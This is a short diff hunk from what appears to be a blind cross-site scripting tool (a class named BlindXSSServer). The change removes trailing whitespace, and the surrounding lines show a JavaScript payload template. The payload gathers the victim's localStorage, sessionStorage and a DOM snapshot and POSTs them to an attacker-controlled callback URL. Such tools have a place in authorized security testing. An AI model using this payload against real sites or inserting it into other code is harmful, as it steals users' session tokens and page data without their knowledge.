@@ -185,22 +185,22 @@ class BlindXSSServer:
             timestamp: new Date().toISOString()
         }}
     }};
-    
+
     // Collect localStorage
     try {{
         data.local_storage = JSON.stringify(localStorage);
     }} catch(e) {{}}
-    
+
     // Collect sessionStorage
     try {{
         data.session_storage = JSON.stringify(sessionStorage);
     }} catch(e) {{}}
-    
+
     // Collect DOM snapshot (limited)
     try {{
         data.dom_snapshot = document.documentElement.outerHTML.substring(0, 100000);
     }} catch(e) {{}}
-    
+
     // Send data
     fetch("{callback_url}", {{
         method: "POST",
